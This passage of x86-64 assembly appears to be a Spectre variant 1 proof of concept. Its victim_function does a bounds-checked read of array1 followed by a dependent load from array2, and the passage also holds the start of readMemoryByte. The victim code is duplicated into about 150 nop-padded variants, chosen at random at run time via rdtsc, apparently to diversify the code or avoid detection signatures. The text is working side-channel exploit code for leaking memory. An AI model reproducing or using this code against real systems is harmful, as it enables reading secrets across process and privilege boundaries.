	jmp	.Lvictim_function_win0_continue
## Variant 68
.Lvictim_function_win0_var68:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 69
.Lvictim_function_win0_var69:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 70
.Lvictim_function_win0_var70:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 71
.Lvictim_function_win0_var71:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 72
.Lvictim_function_win0_var72:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 73
.Lvictim_function_win0_var73:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 74
.Lvictim_function_win0_var74:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 75
.Lvictim_function_win0_var75:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 76
.Lvictim_function_win0_var76:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 77
.Lvictim_function_win0_var77:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	nop
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 78
.Lvictim_function_win0_var78:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 79
.Lvictim_function_win0_var79:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 80
.Lvictim_function_win0_var80:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 81
.Lvictim_function_win0_var81:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 82
.Lvictim_function_win0_var82:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 83
.Lvictim_function_win0_var83:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 84
.Lvictim_function_win0_var84:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 85
.Lvictim_function_win0_var85:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 86
.Lvictim_function_win0_var86:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 87
.Lvictim_function_win0_var87:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 88
.Lvictim_function_win0_var88:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 89
.Lvictim_function_win0_var89:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 90
.Lvictim_function_win0_var90:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 91
.Lvictim_function_win0_var91:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 92
.Lvictim_function_win0_var92:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 93
.Lvictim_function_win0_var93:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 94
.Lvictim_function_win0_var94:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
	nop
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 95
.Lvictim_function_win0_var95:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 96
.Lvictim_function_win0_var96:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 97
.Lvictim_function_win0_var97:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 98
.Lvictim_function_win0_var98:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 99
.Lvictim_function_win0_var99:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 100
.Lvictim_function_win0_var100:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	nop
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 101
.Lvictim_function_win0_var101:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 102
.Lvictim_function_win0_var102:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 103
.Lvictim_function_win0_var103:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 104
.Lvictim_function_win0_var104:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 105
.Lvictim_function_win0_var105:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 106
.Lvictim_function_win0_var106:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 107
.Lvictim_function_win0_var107:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 108
.Lvictim_function_win0_var108:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 109
.Lvictim_function_win0_var109:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 110
.Lvictim_function_win0_var110:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 111
.Lvictim_function_win0_var111:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 112
.Lvictim_function_win0_var112:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 113
.Lvictim_function_win0_var113:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 114
.Lvictim_function_win0_var114:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 115
.Lvictim_function_win0_var115:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 116
.Lvictim_function_win0_var116:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 117
.Lvictim_function_win0_var117:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 118
.Lvictim_function_win0_var118:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 119
.Lvictim_function_win0_var119:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 120
.Lvictim_function_win0_var120:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	nop
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 121
.Lvictim_function_win0_var121:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 122
.Lvictim_function_win0_var122:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 123
.Lvictim_function_win0_var123:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 124
.Lvictim_function_win0_var124:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 125
.Lvictim_function_win0_var125:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 126
.Lvictim_function_win0_var126:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 127
.Lvictim_function_win0_var127:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 128
.Lvictim_function_win0_var128:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 129
.Lvictim_function_win0_var129:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 130
.Lvictim_function_win0_var130:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 131
.Lvictim_function_win0_var131:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 132
.Lvictim_function_win0_var132:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 133
.Lvictim_function_win0_var133:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 134
.Lvictim_function_win0_var134:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 135
.Lvictim_function_win0_var135:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 136
.Lvictim_function_win0_var136:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 137
.Lvictim_function_win0_var137:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 138
.Lvictim_function_win0_var138:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 139
.Lvictim_function_win0_var139:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 140
.Lvictim_function_win0_var140:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	nop
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 141
.Lvictim_function_win0_var141:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 142
.Lvictim_function_win0_var142:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 143
.Lvictim_function_win0_var143:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 144
.Lvictim_function_win0_var144:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 145
.Lvictim_function_win0_var145:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 146
.Lvictim_function_win0_var146:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 147
.Lvictim_function_win0_var147:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 148
.Lvictim_function_win0_var148:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 149
.Lvictim_function_win0_var149:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
.Lvictim_function_win0_continue:
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movzbl	(%rax,%rcx), %ecx
	movzbl	_temp(%rip), %eax
	andl	%ecx, %eax
                                        ## kill: def $al killed $al killed $eax
	movb	%al, _temp(%rip)
LBB0_2:
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_readMemoryByte                 ## -- Begin function readMemoryByte
	.p2align	4, 0x90
_readMemoryByte:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$144, %rsp
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movq	%rcx, -48(%rbp)
	movl	$0, -72(%rbp)
	movl	$0, -56(%rbp)
LBB1_1:                                 ## =>This Inner Loop Header: Depth=1
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win9_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win9_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win9_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win9_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win9_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win9_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win9_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win9_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win9_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win9_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win9_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win9_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win9_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win9_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win9_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win9_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win9_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win9_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win9_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win9_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win9_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win9_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win9_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win9_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win9_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win9_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win9_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win9_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win9_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win9_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win9_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win9_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win9_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win9_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win9_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win9_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win9_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win9_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win9_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win9_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win9_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win9_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win9_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win9_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win9_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win9_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win9_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win9_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win9_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win9_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win9_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win9_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win9_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win9_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win9_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win9_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win9_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win9_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win9_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win9_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win9_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win9_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win9_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win9_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win9_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win9_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win9_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win9_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win9_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win9_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win9_var70
